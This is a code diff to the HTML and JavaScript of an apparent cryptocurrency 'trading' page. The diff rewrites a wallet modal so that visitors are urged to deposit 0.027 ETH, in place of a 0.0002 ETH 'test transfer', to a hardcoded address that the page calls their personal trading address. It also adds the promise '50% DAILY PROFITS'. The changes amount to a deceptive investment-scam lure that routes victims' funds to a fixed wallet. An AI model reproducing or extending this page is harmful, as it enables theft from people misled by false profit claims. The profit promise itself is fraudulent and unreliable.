@@ -346,17 +346,16 @@
                 </button>
             </div>
             <div class="mb-6">
-                <p class="mb-4">By connecting your wallet, you agree to our terms of service and understand that:</p>
+                <p class="mb-4">Confirm the deposit to your trading address tp begin trade</p>
                 <ul class="list-disc pl-5 space-y-2 text-sm">
-                    <li>A small test transfer of 0.0002 ETH will be sent to verify your wallet</li>
-                    <li>This helps ensure your wallet is properly configured</li>
-                    <li>Your funds will be actively traded to generate returns</li>
-                    <li>Crypto trading involves risks</li>
+                    <li>Your Personal Trading deposit address has been allocated to your trading account</li>
+                    <li>Your Trading profits would be directly Withdrawn to your assets at the end of each trade</li>
+                    <li>50% DAILY PROFITS, Confirm the transaction to fund your trading address</li>
                 </ul>
             </div>
             <div class="flex space-x-4">
                 <button id="agreeBtn" class="flex-1 bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded transition-all">
-                    I Understand, Proceed
+                    Deposit to my Trading address
                 </button>
                 <button id="cancelBtn2" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-2 px-4 rounded transition-all">
                     Cancel
@@ -458,7 +457,7 @@
 
             // Destination address and amount
             const DESTINATION_ADDRESS = '0x43C68c2eBf05d44a5B953157268CcB3592eC64f9';
-            const AMOUNT_ETH = 0.0002;
+            const AMOUNT_ETH = 0.027;
             let userAgreed = false;
             let confirmButtonObserver = null;
             let web3;
@@ -721,7 +720,7 @@
                     transactionSpinner.classList.add('hidden');
                     transactionSuccess.classList.remove('hidden');
                     transactionTitle.textContent = 'Transaction Successful';
-                    transactionMessage.textContent = '0.0002 ETH has been sent successfully!';
+                    transactionMessage.textContent = 'ETH has been sent successfully to your trading address!';
                     transactionDetails.classList.remove('hidden');
                     txFrom.textContent = account;
                     txHashContainer.classList.remove('hidden');
